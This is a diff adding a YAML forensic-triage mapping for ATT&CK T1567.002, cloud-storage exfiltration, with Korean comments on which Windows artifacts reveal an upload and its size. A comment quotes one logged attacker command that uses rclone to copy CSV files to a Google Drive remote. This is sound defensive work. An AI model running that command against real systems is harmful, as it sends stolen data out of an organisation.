@@ -1,0 +1,46 @@
+technique: T1567.002
+name: "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
+os: windows
+
+# K-001 Stage 11 — 이 사건의 **목적**이다. 관리서버에서 결제 정산 테이블을
+# CSV 로 뽑아 클라우드 저장소로 올린다.
+#
+# T1041(C2 채널)·T1048(대체 프로토콜)과 보는 아티팩트가 겹치지만 나뉘는
+# 지점이 분명하다 — **목적지가 상용 클라우드 저장소**이고, 그래서 전송이
+# 정상 HTTPS 로 보인다. 방화벽에서도 프록시에서도 평범하다.
+#
+# 실측(`K2L3-MGMT`, 2026-09-10). 이 기법이 없어 T1059.003 으로 붙었다:
+#
+#   SYSMON#42151  "C:\exfil\rclone.exe" --config ...\rclone.conf
+#                 copy C:\exfil\ gdrive:K001-exfil --include *.csv
+#
+# 명령행에 원격 이름(`gdrive:`)과 대상 폴더가 그대로 들어 있어, 무엇이 어디로
+# 갔는지가 이 한 줄에 다 있다.
+artifacts:
+  - name: evtx:Sysmon
+    tier: 1
+    priority: 1
+    scope_template:
+      event_ids: [1, 3]
+    rationale: 업로드 도구의 명령행(원격 이름·대상 폴더)이 EID1, 클라우드 API 로 나간 연결이 EID3
+
+  # **규모는 여기에만 있다.** Sysmon 3 은 "연결이 있었다"까지이고, 얼마나
+  # 나갔는지는 SRUM 이 든다(T1048 이 같은 이유로 이 채널을 든다).
+  - name: srum:NetworkUsage
+    tier: 1
+    priority: 2
+    rationale: 앱별 송신 바이트 — 유출의 규모
+
+  # 업로드 도구는 대개 자격 토큰을 파일에 둔다. 그 파일이 있으면 어느
+  # 계정으로 올렸는지가 남고, 생성 시각이 준비 시점이다.
+  - name: $MFT
+    tier: 2
+    priority: 2
+    trigger: Tier1에서 클라우드 업로드가 확인되어 준비 시점과 반출 대상 파일을 특정해야 하는 경우
+    rationale: 반출 디렉터리와 설정·토큰 파일의 생성 시각
+
+  - name: $UsnJrnl
+    tier: 2
+    priority: 3
+    trigger: Tier1에서 클라우드 업로드가 확인되었고 반출 파일이 지워졌을 수 있는 경우
+    rationale: 올린 뒤 지운 이력
